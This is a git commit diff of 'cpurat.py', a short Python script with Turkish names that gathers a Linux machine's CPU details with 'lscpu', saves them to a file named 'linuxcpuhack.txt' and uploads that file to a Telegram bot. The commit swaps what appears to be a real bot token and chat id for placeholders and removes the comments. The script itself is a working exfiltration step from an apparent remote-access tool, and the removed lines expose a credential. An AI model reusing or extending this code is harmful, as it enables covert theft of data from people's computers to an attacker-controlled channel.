ac8beea80390d74b7fe7ae8b4ea716c4049f22a8
RAMO <156857438+NarkotixSix@users.noreply.github.com>
2024-03-28 06:40:51 +0300

    cpurat.py

--- cpurat.py
+++ cpurat.py
@@ -1,28 +1,28 @@
 import requests 
 import subprocess
  
-TOKEN = "7012404778:AAHqzFHEmAq2egqfiNwnRs0XQXJ9M4BOa9c"
-chat_id = "2099296970"
+TOKEN = "tokeniniz"
+chat_id = "chat_id"
 
-def cpubilgial_linux(): #Linux
+def cpubilgial_linux(): 
     cpu_info = subprocess.run(["lscpu"], stdout=subprocess.PIPE, text=True)
     çıktı = cpu_info.stdout
-    
-    # CPU bilgilerini dosyaya yazma
+
+ 
     with open("linuxcpuhack.txt", "w") as dosya:
         dosya.write(çıktı) 
     
-    # Dosya yolunu alarak API'ye gönderme
+    
     dosyakonumu = subprocess.run(["realpath", "linuxcpuhack.txt"], stdout=subprocess.PIPE, text=True)
     dosyakonumu_str = dosyakonumu.stdout.strip()
     file_path = "linuxcpuhack.txt"
     
     api = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     
-    # Dosyayı API'ye gönderme
+  
     with open(file_path, "rb") as file:
         files = {"document": open(file_path, "rb")}
         response = requests.post(api, data={"chat_id": chat_id}, files=files)
 
-# Fonksiyonu çağırma
+
 cpubilgial_linux()
